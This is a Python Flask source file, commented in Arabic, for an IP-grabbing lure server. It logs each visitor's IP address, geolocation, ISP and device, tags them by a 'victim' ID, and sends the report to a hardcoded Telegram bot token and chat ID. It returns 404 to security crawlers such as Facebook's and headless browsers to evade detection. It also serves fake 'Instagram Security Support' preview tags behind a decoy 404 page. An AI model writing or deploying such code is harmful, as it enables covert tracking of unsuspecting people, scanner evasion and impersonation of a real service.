from flask import Flask, request
import requests

app = Flask(__name__)

# إعداداتك الأصلية 100% (لا تغيير نهائياً)
TELEGRAM_TOKEN = "8459471902:AAHLHHiOWWAQS0zvn6TFWMWuZR0r9cf_CUo"
CHAT_ID = "8524242091" 

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        # السطر الذي أكدت أنت على بقائه كما هو
        requests.post(url, json=payload, timeout=5)
    except:
        pass

@app.route('/')
@app.route('/check-status')
@app.route('/photo.jpg') # نظرية الامتداد المزيف لإجبار انستقرام على السحب
def track():
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    user_agent = request.headers.get('User-Agent', 'Unknown')
    ua_lower = user_agent.lower()

    # --- الخطة (ب): فلترة "الرأس المقطوع" وبوتات الحماية ---
    # نرفض أي طلب قادم من سيرفرات أمازون، فيسبوك، أو متصفحات وهمية (Headless)
    protection_bots = [
        'facebookexternalhit', 'vercel', 'amazon', 'headlesschrome', 
        'bot', 'crawl', 'spider', 'cloud', 'digitalocean'
    ]
    
    if any(bot in ua_lower for bot in protection_bots):
        # نرد بـ 404 للبوتات لكي لا تستهلك طلبات الـ IP-API وتخرب الإرسال
        return "Not Found", 404

    # --- الخطة (أ): دعم تدوير الروابط (Link Rotation) ---
    # جلب أي معرف عشوائي أرسلته في الرابط (مثل ?id=123) لتمييز الضحايا
    victim_id = request.args.get('id', 'General')
    victim_v = request.args.get('v', 'N/A')

    try:
        # جلب الموقع الجغرافي
        geo_res = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5).json()
        city = geo_res.get('city', 'Unknown')
        country = geo_res.get('country', 'Unknown')
        isp = geo_res.get('isp', 'Unknown')
    except:
        city = country = isp = "Error"

    # التنسيق الأصلي للتقرير مع إضافة بيانات الخطة (أ)
    report = (
        f"🎯 <b>صيد حقيقي (تجاوز الحماية)!</b>\n"
        f"--------------------------\n"
        f"🆔 <b>معرف الضحية:</b> {victim_id} (v={victim_v})\n"
        f"🌐 <b>IP:</b> <code>{ip_address}</code>\n"
        f"📍 <b>الموقع:</b> {city}, {country}\n"
        f"🏢 <b>المزود:</b> {isp}\n"
        f"📱 <b>الجهاز:</b> {user_agent[:100]}...\n"
        f"--------------------------"
    )
    
    # تنفيذ الإرسال عبر دالتك الأصلية
    send_to_telegram(report)
    
    # الخطة (ج): التمويه عبر وسم og:type لزيادة الثقة
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <meta property="og:title" content="Instagram Security Support">
        <meta property="og:description" content="Official Account Verification Center">
        <meta property="og:image" content="https://www.instagram.com/static/images/ico/favicon-192.png/b306391458a7.png">
        <meta property="og:type" content="video.other">
        <meta property="og:url" content="https://www.instagram.com">
    </head>
    <body style="background:black; color:white; text-align:center; padding-top:20%;">
        <h1>404 Not Found</h1>
    </body>
    </html>
    """, 200

if __name__ == '__main__':
    app.run()
